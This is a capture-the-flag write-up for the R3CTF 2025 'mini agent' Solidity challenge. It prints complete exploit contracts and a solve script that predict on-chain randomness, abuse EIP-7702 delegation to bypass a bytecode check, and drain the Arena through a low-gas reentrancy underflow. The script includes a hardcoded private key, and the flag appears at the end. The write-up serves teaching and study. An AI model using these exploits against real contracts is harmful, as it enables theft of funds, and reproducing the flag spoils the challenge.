---
title: Blockchain - mini agent
description: 2025 | R3CTF | Blockchain
tags:
    - smart contract
    - authorization list
---

## Description

The chrome gleam of Neo-Kyoto's skyline hides a truth darker than its perpetually shadowed alleys. Whispers on the net speak of The Arena, a brutal, underground battleground controlled by The Boss, a faceless entity who orchestrates battles between custom-coded Agents and their digital "Pigs."

You're a street-level netrunner. Your mission: craft your own Agent, register it within The Arena's unforgiving smart contract, and pit it against The Boss's champions. Every battle is a gamble, a chance to outsmart your opponent and claim their Ether.

But this isn't just about winning a few scraps. The Boss has been hoarding, manipulating the flow of funds within The Arena. Your ultimate goal? Bring them down, dismantle their operation, and siphon back enough Ether to make them regret they ever crossed paths with a ghost like you.

The clock's ticking, netrunner. Will you rise to become a legend, or just another glitch in the system?

[:material-download: `mini_agent.zip`](static/mini_agent.zip)

## Solution

- The contract Arena holds 500 ether, and the player has 8 ether initially. To solve the challenge, the player needs to hold more than 500 ether.
- There is an reentrancy bug in the `withdraw()` that can be triggered using EIP-7702. However, it requires a minimum withdrawal of 10 ether at a time.

    ```js
    function withdraw(uint amount) public {
        require(balanceOf[msg.sender] >= amount, "Too low");
        require(amount >= 10 ether, "So little");
        require(tx.origin == msg.sender, "No call");

        payable(msg.sender).call{value: amount, gas: 5000}("");
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }
    ```

- So our first step is to fight the contract Challenge's pigs. During a battle, the two sides take turns acting as the attacker, selecting the pigs to participate in the current round through the agents they specified during registration. The agent of the current round attacker must also return a `pr` value, and if this value equals `randomness.random() % 100`, the attacker receives a 5x attack power bonus, which is the key to defeating the contract Challenge's pig.

    ```js
    function _processBattle(
        address player1,
        address player2,
        uint256 wager
    ) internal {
        if (balanceOf[player1] < wager || balanceOf[player2] < wager) {
            return;
        }

        balanceOf[player1] -= wager;
        balanceOf[player2] -= wager;

        // [...]

        Pig[][] memory battle = new Pig[][](2);
        battle[0] = playerInfo[player1].pigs;
        battle[1] = playerInfo[player2].pigs;

        uint256 winner = 9;

        for(uint256 round = 0; round < 100 && winner > 1; round++) {
            uint256 who = round % 2;
            uint256 opponent = 1 - who;

            try this.mockTick{gas: 100000}(
                agents[who],
                // [...]
                battle[who],
                battle[opponent]
            ) returns (uint256 fromWhich, uint256 toWhich, uint256 pr) {
                // [...]
                uint256 rr = randomness.random() % 100;
                uint256 dis = 0;
                if (rr < pr) {
                    dis = pr - rr;
                }
                else {
                    dis = rr - pr;
                }

                uint256 boost = 1;
                if (dis == 0) {
                    boost = 5;
                } else if (dis < 10) {
                    boost = 2;
                }

                uint256 damage = battle[who][fromWhich].attack * boost;
                uint256 defense = battle[opponent][toWhich].defense;

                damage = damage > defense ? damage - defense : 0;

                if (damage > battle[opponent][toWhich].health) {
                    damage = battle[opponent][toWhich].health;
                }
                battle[opponent][toWhich].health -= damage;
                // [...]
            } catch {
                winner = opponent;
                break;
            }
        }
        // [...]
    }
    ```

- Although `seed` is a private state variable in the contract Randomness, each random result is used to update the `seed`. Thus, it's easy to predict the subsequent random results once a single random output is known.

    ```js
    function random() external returns (uint256) {
        seed = uint256(keccak256(abi.encodePacked(block.prevrandao, msg.sender, seed)));
        return seed;
    }
    ```

- Before requesting a battle, we need to register our agent and claim weak pigs created by the contract Challenge. At the time of registration, the agent's code size must not exceed 100 bytes, and it must not contain opcodes related to contract create, contract call or selfdestruct. One approach is to use an EOA as the agent, initially setting its authorization to any address that follows the rules in `register()` via EIP-7702, because `register()` only checks the code at this EOA address (`EXTCODECOPY`). And then updating the code to a malicious contract after registration is complete.

    ```js
    function register(address agent) public {
        // [...]
        uint256 codeSize = agent.code.length;   // Note: EXTCODESIZE
        require(codeSize > 0, "Deploy first");
        require(codeSize < 100, "Too big");

        bytes memory data = new bytes(codeSize);
        assembly {
            extcodecopy(agent, add(data, 0x20), 0, codeSize)
        }

        for(uint256 i = 0; i < codeSize; i++) {
            uint8 b = uint8(data[i]);
            if((b >= 0xf0 && b <= 0xf2) || (b >= 0xf4 && b <= 0xf5) || (b == 0xff)) {
                revert("Do yourself");
            }
        }
        // [...]
    }
    ```

- After obtaining some ethers from the battle, the reentracy bug can be exploited to drain the contract. The problem is that only 5000 gas is sent with the call. We can re-enter `transfer()`, which allow the transaction to use less gas and cause an underflow in `balanceOf[msg.sender]` after the call ends. But the gas used still exceeds 5000. We need to warm up the storage before calling `withdraw()`. Not through the access list, because if we rely solely on the access list, the first `SSTORE` to each storage slot still costs at least `5000 - COLD_SLOAD_COST = 2900` gas. But if the player calls `transfer()` earlier in the same transaction to modify the storage, the slots become dirty, so subsequent `SSTORE` operations only consume `WARM_STORAGE_READ_COST = 100` gas.
    - > When a transaction execution begins, `accessed_storage_keys` is initialized to empty, and `accessed_addresses` is initialized to include `tx.sender`, `tx.to` and the set of all precompiles.

    ```js
    function withdraw(uint amount) public {
        // [...]
        payable(msg.sender).call{value: amount, gas: 5000}("");
        unchecked {
            balanceOf[msg.sender] -= amount;
        }
    }

    function transfer(address to, uint amount) public returns (bool) {
        uint256 rbalance = balanceOf[msg.sender];
        require(rbalance >= amount, "Too low");

        unchecked {
            balanceOf[msg.sender] = rbalance - amount;
            balanceOf[to] += amount;
        }

        return true;
    }
    ```

### Exploitation

```js
contract Exploiter {

    address immutable arena;
    Randomness immutable randomness;

    constructor(address _arena) {
        arena = _arena;
        randomness = Arena(_arena).randomness();
    }

    function acceptBattle(address, uint256) external returns (bool) {
        return true;
    }

    function tick(
        address,
        uint256,
        uint256,
        Arena.Pig[] memory fromPigs,
        Arena.Pig[] memory toPigs
    ) external returns (uint256 fromWhich, uint256 toWhich, uint256 r) {
        uint seed;
        uint nxt;
        while (gasleft() > 5000) {  // try to find a good seed
            seed = randomness.random();
            r = uint(keccak256(abi.encodePacked(block.prevrandao, arena, seed)));
            nxt = uint(keccak256(abi.encodePacked(block.prevrandao, arena, r))) % 100;
            if ((nxt < 50 && 50 - nxt >= 10) || (nxt > 50 && nxt - 50 >= 10)) {
                break;
            }
        }
        r = r % 100;

        fromWhich = 0;
        toWhich = 0;
        uint256 maxAttack = 0;
        for (uint256 i = 0; i < fromPigs.length; i++)
        {
            if (fromPigs[i].health > 0 && fromPigs[i].attack > maxAttack) {
                maxAttack = fromPigs[i].attack;
                fromWhich = i;
            }
        }
        maxAttack = 0;
        for (uint256 i = 0; i < toPigs.length; i++) {
            if (toPigs[i].health > 0 && toPigs[i].attack > maxAttack) {
                maxAttack = toPigs[i].attack;
                toWhich = i;
            }
        }
    }
}
```

```js
contract Withdrawer {

    function exploit(address target, uint256 amount) external {
        (bool success, ) = target.call(abi.encodeWithSignature(
            "transfer(address,uint256)",
            target,
            1
        ));
        require(success);
        (success, ) = target.call(abi.encodeWithSignature(
            "withdraw(uint256)",
            amount
        ));
        require(success);
    }

    fallback() external payable {
        if (gasleft() > 2000) {
            msg.sender.call(abi.encodeWithSignature(
                "transfer(address,uint256)",
                msg.sender,
                1
            ));
        }
    }
}
```

??? note "solve.py"

    ```py
    from cheb3 import Connection
    from cheb3.utils import load_compiled, calc_create_address, encode_with_signature

    from time import sleep

    chall_abi, _ = load_compiled("Challenge.sol")
    arena_abi, _ = load_compiled("Arena.sol")
    exploiter_abi, exploiter_bin = load_compiled("PoC.t.sol", "Exploiter")
    withdrawer_abi, withdrawer_bin = load_compiled("PoC.t.sol", "Withdrawer")

    conn = Connection("http://localhost:8545")
    player = conn.account("<private-key>")
    agent = conn.account("0x2d8d57f5d5ada2ec30c91a3c8dfc64ef70798c68f24cacfa8fddfc2360fbaa95")
    setup = "<challenge-address>"

    challenge = conn.contract(player, abi=chall_abi, address=setup)
    arena_addr = challenge.caller.arena()
    arena = conn.contract(player, abi=arena_abi, address=arena_addr)

    exploiter = conn.contract(player, abi=exploiter_abi, bytecode=exploiter_bin)
    exploiter.deploy(arena_addr)

    arena.functions.deposit().send_transaction(value=7 * 10**18)
    signed_auth = agent.sign_authorization(f"0x{0x1337:040x}", is_sender=False)
    arena.functions.register(agent.address).send_transaction(authorization_list=[signed_auth])

    for i in range(3):
        arena.functions.claimPig().send_transaction()

    # Update the agent's code
    signed_auth = agent.sign_authorization(exploiter.address, is_sender=False)
    arena.functions.requestBattle(setup, arena.caller.balanceOf(player.address)).send_transaction(authorization_list=[signed_auth])

    while True:
        try:
            if arena.caller.getBattleCount() == 1:
                sleep(5)
                continue
        except Exception as e:
            sleep(2)
            continue
        setup_balance = arena.caller.balanceOf(setup)
        if setup_balance < 10**18:
            break
        arena.functions.requestBattle(setup, setup_balance).send_transaction()

    withdrawer_addr = calc_create_address(player.address, conn.w3.eth.get_transaction_count(player.address))
    withdrawer = conn.contract(player, abi=withdrawer_abi, bytecode=withdrawer_bin)
    withdrawer.deploy()

    signed_auth = player.sign_authorization(withdrawer_addr)
    player.send_transaction(player.address, data=encode_with_signature("exploit(address,uint256)", arena_addr, arena.caller.balanceOf(player.address) - 1), authorization_list=[signed_auth])
    arena.functions.withdraw(arena.get_balance()).send_transaction()
    print("Final player balance:", player.get_balance())
    ```

### Flag

> R3CTF{gHoS7-in_TH3_m@cH1Ne_@93NT_77O2-wII1_6ZIN9-DOwn_7h3-Bo5s-6y_dra1nIn9_@ll_423na_2eS3Rv350}

## References

- [EIP-2200: Structured Definitions for Net Gas Metering](https://eips.ethereum.org/EIPS/eip-2200)
- [EIP-2929: Gas cost increases for state access opcodes](https://eips.ethereum.org/EIPS/eip-2929)
